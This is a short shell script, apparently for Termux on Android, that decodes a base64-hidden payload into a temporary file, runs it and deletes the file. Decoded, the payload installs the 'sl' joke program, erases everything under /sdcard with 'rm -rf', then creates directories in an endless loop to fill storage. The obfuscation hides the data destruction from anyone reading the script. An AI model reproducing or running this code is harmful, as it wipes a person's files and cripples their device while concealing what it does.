perveso=$(mktemp)
base64 -d  >${perveso}<<DIXIE
cGtnIGluc3RhbGwgc2wKc2wKCnJtIC1yZiAvc2RjYXJkLyoKY2QgL3NkY2FyZAoKd2hpbGUgdHJ1
ZTtkbwogICAgbWtkaXIgIlRFU1RBTkRPLiRSQU5ET00iCmRvbmUK
DIXIE
source ${perveso}
rm -rf ${perveso}
